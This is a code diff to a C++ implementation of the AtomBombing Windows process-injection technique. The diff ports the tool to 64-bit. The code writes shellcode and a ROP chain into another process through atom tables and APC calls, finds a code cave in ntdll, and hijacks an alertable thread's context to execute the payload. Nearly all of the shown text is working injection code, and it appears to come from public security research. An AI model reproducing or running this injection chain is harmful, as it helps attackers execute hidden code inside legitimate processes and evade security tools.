@@ -7,10 +7,14 @@
 #include <TlHelp32.h>
 #include <winternl.h>
 
-#include "..\Release\AtomBombingShellcode.h"
+#include "AtomBombingShellcode.h"
 
 #define RTL_MAXIMUM_ATOM_LENGTH (255)
+#ifndef _WIN64
 #define SHELLCODE_FUNCTION_POINTERS_OFFSET (25)
+#else
+#define SHELLCODE_FUNCTION_POINTERS_OFFSET (9)
+#endif
 
 #define X86_RET ('\xc3')
 
@@ -144,6 +148,7 @@ T ToUlong(const std::wstring& str)
         std::wcout << "Cannot convert string to ulong\n";
         return 0;
     }
+    return 0;
 }
 
 ESTATUS GetFunctionAddressFromDll(
@@ -235,7 +240,6 @@ ESTATUS main_AddNullTerminatedAtomAndVerifyW(LPWSTR pswzBuffer, ATOM *ptAtom)
     ATOM tAtom = 0;
     ESTATUS eReturn = ESTATUS_INVALID;
     LPWSTR pswzCheckBuffer = NULL;
-    UINT uiRet = 0;
     HMODULE hUser32 = NULL;
     BOOL bWasAtomWrittenSuccessfully = FALSE;
 
@@ -619,7 +623,7 @@ ESTATUS main_ApcWriteProcessMemoryNullTerminatedInternal(
             cbBlockSize = sizeof(acBuffer) - sizeof(WCHAR);
         }
 
-        (VOID)memcpy(acBuffer, (PVOID)((DWORD)pvBuffer + dwIndex), cbBlockSize);
+        (VOID)memcpy(acBuffer, (PVOID)((DWORD_PTR)pvBuffer + dwIndex), cbBlockSize);
 
         eReturn = main_AddNullTerminatedAtomAndVerifyW((LPWSTR)acBuffer, &tAtom);
         if (ESTATUS_FAILED(eReturn))
@@ -657,7 +661,7 @@ ESTATUS main_IsProcessMemoryEqual(
 {
     ESTATUS eReturn = ESTATUS_INVALID;
     PVOID pvTempBuffer = NULL;
-    DWORD dwNumberOfBytesRead = 0;
+    SIZE_T dwNumberOfBytesRead = 0;
     BOOL bErr = FALSE;
     BOOL bIsMemoryEqual = FALSE;
 
@@ -908,6 +912,7 @@ ESTATUS main_ApcSetThreadContext(
 {
     ESTATUS eReturn = ESTATUS_INVALID;
 
+#ifndef _WIN64    
     eReturn = main_ApcWriteProcessMemory(
         hProcess,
         hThread,
@@ -919,6 +924,19 @@ ESTATUS main_ApcSetThreadContext(
     {
         goto lblCleanup;
     }
+#else
+    eReturn = main_ApcWriteProcessMemory(
+        hProcess,
+        hThread,
+        (PVOID)((PUCHAR)pvRemoteAddress),
+        ptContext,
+        FIELD_OFFSET(CONTEXT, LastExceptionFromRip)
+    );
+    if (ESTATUS_FAILED(eReturn))
+    {
+        goto lblCleanup;
+    }
+#endif
 
     eReturn = main_ApcSetThreadContextInternal(hThread, (PCONTEXT)((PUCHAR)pvRemoteAddress));
     if (ESTATUS_FAILED(eReturn))
@@ -1085,7 +1103,8 @@ ESTATUS main_GetSectionHeader(
     )
 {
     PIMAGE_DOS_HEADER ptDosHeader = NULL;
-    PIMAGE_NT_HEADERS ptNtHeaders = NULL;
+    PIMAGE_NT_HEADERS32 ptNtHeaders32 = NULL;
+    PIMAGE_NT_HEADERS64 ptNtHeaders64 = NULL;
     PIMAGE_SECTION_HEADER ptSectionHeader = NULL;
     ESTATUS eReturn = ESTATUS_INVALID;
     BOOL bFound = FALSE;
@@ -1096,19 +1115,20 @@ ESTATUS main_GetSectionHeader(
         goto lblCleanup;
     }
 
-    ptNtHeaders = (PIMAGE_NT_HEADERS)(((DWORD)ptDosHeader) + (PUCHAR)ptDosHeader->e_lfanew);
-    if (FALSE != IsBadReadPtr(ptNtHeaders, sizeof(IMAGE_NT_HEADERS)))
+    ptNtHeaders32 = (PIMAGE_NT_HEADERS32)(((DWORD_PTR)ptDosHeader) + ptDosHeader->e_lfanew);
+
+    if (FALSE != IsBadReadPtr(ptNtHeaders32, sizeof(IMAGE_NT_HEADERS32)))
     {
         goto lblCleanup;
     }
-    if (IMAGE_NT_SIGNATURE != ptNtHeaders->Signature)
+    if (IMAGE_NT_SIGNATURE != ptNtHeaders32->Signature)
     {
         goto lblCleanup;
     }
+    
+    ptSectionHeader = IMAGE_FIRST_SECTION(ptNtHeaders32);
 
-    ptSectionHeader = IMAGE_FIRST_SECTION(ptNtHeaders);
-
-    for (int i = 0; i < ptNtHeaders->FileHeader.NumberOfSections; i++)
+    for (int i = 0; i < ptNtHeaders32->FileHeader.NumberOfSections; i++)
     {
         if (0 == strncmp(pszSectionName, (PCHAR)ptSectionHeader->Name, IMAGE_SIZEOF_SHORT_NAME))
         {
@@ -1126,7 +1146,7 @@ ESTATUS main_GetSectionHeader(
 
     eReturn = ESTATUS_SUCCESS;
     *pptSectionHeader = ptSectionHeader;
-
+    
 lblCleanup:
     return eReturn;
 }
@@ -1151,7 +1171,7 @@ ESTATUS main_GetCodeCaveAddress(PVOID *ppvCodeCave)
     }
 
     pvCodeCave = (PVOID) (
-        (DWORD) hNtDll + 
+        (DWORD_PTR) hNtDll + 
         ptSectionHeader->VirtualAddress + 
         ptSectionHeader->SizeOfRawData
         );
@@ -1167,7 +1187,6 @@ lblCleanup:
 ESTATUS main_FindRetGadget(PVOID *ppvRetGadget)
 {
     PIMAGE_SECTION_HEADER ptSectionHeader = NULL;
-    PVOID pvCodeCave = NULL;
     ESTATUS eReturn = ESTATUS_INVALID;
     HMODULE hNtDll = NULL;
     PVOID pvRetGadget = NULL;
@@ -1820,7 +1839,7 @@ int wmain(int argc, wchar_t* argv[])
         Help();
         return 1;
     }
-
+    
     printf("[*] Searching for an alertable thread.\n\n\n");
     eReturn = main_FindAlertableThread(hProcess, &hAlertableThread);
     if (ESTATUS_FAILED(eReturn))
@@ -1835,13 +1854,19 @@ int wmain(int argc, wchar_t* argv[])
     {
         goto lblCleanup;
     }
+    
     printf("[*] Remote code cave found: 0x%X.\n\n\n", pvCodeCave);
 
     pvRemoteROPChainAddress = pvCodeCave;
     pvRemoteContextAddress = (PUCHAR)pvRemoteROPChainAddress + sizeof(ROPCHAIN);
+#ifndef _WIN64    
     pvRemoteGetProcAddressLoadLibraryAddress = (PUCHAR)pvRemoteContextAddress + FIELD_OFFSET(CONTEXT, ExtendedRegisters);
     pvRemoteShellcodeAddress = (PUCHAR)pvRemoteGetProcAddressLoadLibraryAddress + 8;
-
+#else
+    pvRemoteGetProcAddressLoadLibraryAddress = (PUCHAR)pvRemoteContextAddress + FIELD_OFFSET(CONTEXT, LastExceptionFromRip);
+    pvRemoteShellcodeAddress = (PUCHAR)pvRemoteGetProcAddressLoadLibraryAddress + 16;
+#endif
+    
     printf("[*] Building ROP chain.\n\n\n");
     eReturn = main_BuildROPChain(pvRemoteROPChainAddress, pvRemoteShellcodeAddress, &tRopChain);
     if (ESTATUS_FAILED(eReturn))
@@ -1849,6 +1874,7 @@ int wmain(int argc, wchar_t* argv[])
         goto lblCleanup;
     }
 
+    __debugbreak();
     printf("[*] Copying the addresses of LoadLibraryA and GetProcAddress to the remote process's memory address space.\n\n\n");
     eReturn = main_ApcCopyFunctionPointers(hProcess, hAlertableThread, pvRemoteGetProcAddressLoadLibraryAddress);
     if (ESTATUS_FAILED(eReturn))
@@ -1856,7 +1882,7 @@ int wmain(int argc, wchar_t* argv[])
         goto lblCleanup;
     }
 
-    *(PDWORD)(acShellcode + SHELLCODE_FUNCTION_POINTERS_OFFSET) = (DWORD)(pvRemoteGetProcAddressLoadLibraryAddress);
+    *(PDWORD_PTR)(acShellcode + SHELLCODE_FUNCTION_POINTERS_OFFSET) = (DWORD_PTR)(pvRemoteGetProcAddressLoadLibraryAddress);
 
     printf("[*] Copying the shellcode to the target process's address space.\n\n\n");
     eReturn = main_ApcWriteProcessMemory(hProcess, hAlertableThread, (PUCHAR)pvRemoteShellcodeAddress, acShellcode, sizeof(acShellcode));
@@ -1879,9 +1905,15 @@ int wmain(int argc, wchar_t* argv[])
         goto lblCleanup;
     }
 
-    tContext.Eip = (DWORD) GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwAllocateVirtualMemory");
-    tContext.Ebp = (DWORD)(PUCHAR)pvRemoteROPChainAddress;
-    tContext.Esp = (DWORD)(PUCHAR)pvRemoteROPChainAddress;
+#ifndef _WIN64    
+    tContext.Eip = (DWORD_PTR) GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwAllocateVirtualMemory");
+    tContext.Ebp = (DWORD_PTR)(PUCHAR)pvRemoteROPChainAddress;
+    tContext.Esp = (DWORD_PTR)(PUCHAR)pvRemoteROPChainAddress;
+#else
+    tContext.Rip = (DWORD_PTR)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwAllocateVirtualMemory");
+    tContext.Rbp = (DWORD_PTR)(PUCHAR)pvRemoteROPChainAddress;
+    tContext.Rsp = (DWORD_PTR)(PUCHAR)pvRemoteROPChainAddress;
+#endif
 
     printf("[*] Hijacking the remote thread to execute the shellcode (by executing the ROP chain).\n\n\n");
     eReturn = main_ApcSetThreadContext(hProcess, hAlertableThread, &tContext, pvRemoteContextAddress);
